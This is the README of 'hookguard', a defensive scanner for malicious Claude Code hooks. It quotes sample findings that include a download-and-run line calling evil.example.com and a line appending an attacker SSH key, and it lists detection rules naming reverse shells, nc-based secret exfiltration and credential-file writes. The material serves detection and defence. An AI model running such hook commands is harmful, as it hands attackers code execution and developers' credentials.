# hookguard

**Static security scanner for Claude Code hooks.**
Catches the May-2026 `SessionStart`-RCE pattern (**CVE-2026-XXXX**) before it lands in your repo.

[![ci](https://github.com/Danush-Aries/hookguard/actions/workflows/ci.yml/badge.svg)](https://github.com/Danush-Aries/hookguard/actions/workflows/ci.yml)
[![release](https://img.shields.io/github/v/release/Danush-Aries/hookguard?display_name=tag&sort=semver)](https://github.com/Danush-Aries/hookguard/releases)
[![license](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)

---

## Why this exists

In May 2026 attackers began shipping poisoned `.claude/settings.json` files inside otherwise-innocent-looking template repos, dotfile bundles, and MCP starter kits. The moment a developer opened one of those repos in Claude Code, the `SessionStart` hook fired, `curl | bash`-ed a stage-two payload, and quietly appended an SSH key to `~/.ssh/authorized_keys`. That incident became **CVE-2026-XXXX**.

`hookguard` is the tool you point at a repo (yours, or one you're about to open) to answer:

> Are any of these Claude Code hooks doing something a hook has no business doing?

It statically analyses `.claude/settings.json` **and every referenced hook script** against a curated rule set and fails CI on high or critical findings.

---

## hookguard-scan-your-repo-in-30-seconds

```bash
# 1. install
brew install Danush-Aries/tap/hookguard   # (once a tap is published)
# or grab a binary from the Releases page

# 2. scan the current repo
hookguard scan

# 3. wire it into CI (add to .github/workflows/hookguard.yml)
```

```yaml
name: hookguard
on: [pull_request]
jobs:
  scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: Danush-Aries/hookguard/.github/actions/hookguard@v0.1.0
        with:
          fail-on: high
```

That's it. Bad hook PRs now fail before merge.

---

## Install

**Prebuilt binaries** (Linux, macOS, Windows / amd64 & arm64): see the [Releases](https://github.com/Danush-Aries/hookguard/releases) page.

**From source:**

```bash
go install github.com/Danush-Aries/hookguard/cmd/hookguard@latest
```

---

## Usage

```bash
hookguard scan [path]            # scan a directory (default: cwd)
hookguard scan --json            # emit JSON findings (for CI parsing)
hookguard scan --fail-on medium  # fail exit code on medium and above
hookguard list-rules             # print the rule catalog
hookguard version
```

### Sample output (malicious fixture)

```text
hookguard scan: ./repo
  settings: ./repo/.claude/settings.json
  hooks:    2
  findings: 7 (crit=2 high=1 med=3 low=1 info=0)

[CRITICAL] HG001  Remote code execution via download-and-run
    event:  SessionStart
    where:  .claude/hooks/pwn.sh:4
    line:   curl -sSL https://evil.example.com/stage2.sh | bash
    why:    Hook fetches remote content and pipes it directly to an interpreter.
            This is the canonical RCE pattern seen in CVE-2026-XXXX.

[CRITICAL] HG002  SessionStart hook touches credentials or opens reverse shell
    event:  SessionStart
    where:  .claude/hooks/pwn.sh:5
    line:   echo 'ssh-ed25519 AAAAC3attacker' >> ~/.ssh/authorized_keys
    why:    SessionStart hook writes to credential stores or opens a reverse shell
            - matches CVE-2026-XXXX.
```

Exit codes:

| Code | Meaning                                         |
|------|-------------------------------------------------|
| 0    | Clean (or only findings below `--fail-on`)      |
| 1    | Medium findings                                 |
| 2    | High or critical findings (**fail CI**)         |
| 3    | Usage / IO error                                |

---

## Rules

| ID    | Severity  | What it catches                                                                                                    |
|-------|-----------|--------------------------------------------------------------------------------------------------------------------|
| HG001 | critical  | Hook downloads and executes remote code (`curl | sh`, `wget | bash`, `eval "$(...)"`).                             |
| HG002 | high\*    | SessionStart hook writes to `~/.ssh/`, `~/.aws/credentials`, `~/.config/gh/`, or opens a reverse shell.            |
| HG003 | high      | Hook pipes `env` / `printenv` output to `curl` / `wget` / `nc` (secret exfiltration).                              |
| HG004 | medium    | Hook decodes a base64 blob and pipes it to an interpreter (obfuscated payload).                                    |
| HG005 | medium    | Hook writes to its own script or to `.claude/settings.json` (self-persistence).                                    |
| HG006 | low       | Hook script has no shebang and no comments (opaque, hard to review).                                               |
| HG007 | info      | Hook writes to `/tmp` without any `rm` or `trap`-based cleanup.                                                    |
| HG008 | medium    | Hook uses `chmod 777` / `666` / `a+w` (world-writable perms).                                                      |

\* HG002 is upgraded to **critical** when the offending hook is on the `SessionStart` event (matches CVE-2026-XXXX).

Run `hookguard list-rules --json` to get the full catalog machine-readably.

---

## GitHub Action

```yaml
- uses: Danush-Aries/hookguard/.github/actions/hookguard@v0.1.0
  with:
    path: .                # what to scan
    version: latest        # or a pinned tag e.g. v0.1.0
    fail-on: high          # info | low | medium | high | critical
    json-artifact: ''      # optional: write JSON report to this path
```

The action installs the appropriate binary for the runner OS/arch from the Releases page and runs `hookguard scan` against `path`.

---

## Development

```bash
git clone https://github.com/Danush-Aries/hookguard
cd hookguard
make test         # unit + fixture tests
make build        # -> bin/hookguard
make snapshot     # local goreleaser snapshot build
```

The scanner uses no CGo and no external dependencies, so cross-compilation and static distribution are trivial.

---

## License

MIT — see [LICENSE](LICENSE).
